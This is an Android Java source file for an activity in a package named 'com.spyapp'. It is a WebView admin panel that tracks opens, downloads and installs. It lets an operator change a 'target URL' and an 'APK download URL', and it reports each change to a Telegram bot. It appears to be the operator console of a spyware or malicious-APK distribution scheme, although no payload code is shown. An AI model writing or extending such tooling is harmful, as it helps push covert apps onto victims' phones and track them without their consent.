package com.spyapp;

import android.annotation.SuppressLint;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;

import androidx.appcompat.app.AppCompatActivity;

public class AdminPanelActivity extends AppCompatActivity {
    
    private WebView adminWebView;
    private ProgressBar progressBar;
    
    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_admin_panel);
        
        adminWebView = findViewById(R.id.adminWebView);
        progressBar = findViewById(R.id.progressBar);
        
        setupWebView();
        
        // Load the admin panel HTML
        adminWebView.loadUrl("file:///android_asset/admin_panel.html");
    }
    
    private void setupWebView() {
        WebSettings settings = adminWebView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setAllowFileAccess(true);
        settings.setAllowContentAccess(true);
        
        adminWebView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                progressBar.setVisibility(View.GONE);
                // Inject real-time data into the HTML
                updateStats(view);
            }
        });
        
        adminWebView.setWebChromeClient(new WebChromeClient());
        
        // Add JavaScript interface
        adminWebView.addJavascriptInterface(new AdminInterface(), "Android");
    }
    
    private void updateStats(WebView view) {
        String js = "javascript:updateStats(" +
                Config.totalOpens + ", " +
                Config.totalDownloads + ", " +
                Config.totalInstalls + ", '" +
                Config.CURRENT_TARGET_URL + "', '" +
                Config.APK_DOWNLOAD_URL + "');";
        view.loadUrl(js);
    }
    
    // JavaScript interface class
    private class AdminInterface {
        @android.webkit.JavascriptInterface
        public void setTargetUrl(String url) {
            Config.CURRENT_TARGET_URL = url;
            runOnUiThread(() -> {
                adminWebView.loadUrl("javascript:showMessage('Target URL updated successfully!')");
            });
            
            // Notify via Telegram
            TelegramBotHelper.sendMessageToAdmin(AdminPanelActivity.this,
                    "🔗 *Target URL Changed*\nNew URL: `" + url + "`");
        }
        
        @android.webkit.JavascriptInterface
        public void setApkUrl(String url) {
            Config.APK_DOWNLOAD_URL = url;
            runOnUiThread(() -> {
                adminWebView.loadUrl("javascript:showMessage('APK URL updated successfully!')");
            });
            
            TelegramBotHelper.sendMessageToAdmin(AdminPanelActivity.this,
                    "📦 *APK URL Changed*\nDownload URL: `" + url + "`");
        }
        
        @android.webkit.JavascriptInterface
        public String getTargetUrl() {
            return Config.CURRENT_TARGET_URL;
        }
        
        @android.webkit.JavascriptInterface
        public String getApkUrl() {
            return Config.APK_DOWNLOAD_URL;
        }
        
        @android.webkit.JavascriptInterface
        public int getTotalOpens() {
            return Config.totalOpens;
        }
        
        @android.webkit.JavascriptInterface
        public int getTotalDownloads() {
            return Config.totalDownloads;
        }
        
        @android.webkit.JavascriptInterface
        public int getTotalInstalls() {
            return Config.totalInstalls;
        }
        
        @android.webkit.JavascriptInterface
        public String getDeviceInfo() {
            return "Model: " + Build.MODEL + "\n" +
                   "Android: " + Build.VERSION.RELEASE + "\n" +
                   "SDK: " + Build.VERSION.SDK_INT;
        }
    }
}
